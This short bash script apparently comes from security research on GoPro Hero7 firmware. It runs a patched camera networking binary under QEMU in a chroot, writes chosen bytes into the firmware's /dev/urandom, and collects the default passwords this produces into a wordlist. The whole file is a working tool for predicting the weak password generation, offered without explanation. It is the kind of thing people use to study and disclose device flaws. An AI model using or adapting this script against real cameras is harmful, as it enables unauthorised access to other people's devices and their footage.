#!/bin/bash

# Loaded up files system, added conf.json and bin files to fuse_b, added gpNet.patched to usr/local/gopro/bin
regex="\bgpNet.patched: Generate RANDOM Password:\s\K[[:alpha:]]+"

for i in `seq 0 255`
do
	echo "testing $i"
	rm conf.json >/dev/null 2>&1
	rm conf.json.bak >/dev/null 2>&1
	rm ../fuse_a/conf.json.bak >/dev/null 2>&1

	#create the psuedo random input
	# first byte is the index to the string array. Next 4 is the digits
	printf -v string '\\x%02x\\x%02x\\x%02x\\x%02x\\x%02x\\x%02x' $i 0 0 0 0 0
	echo -ne $string > /home/trunk/gopro/hero7/fs/dev/urandom

	#run it in QEMU with the gopro filesystem as root
	chroot /home/trunk/gopro/hero7/fs ./qemu-arm-static usr/local/gopro/bin/gpNet.patched &> a.o
	grep -Po "$regex" a.o >> password.list
done





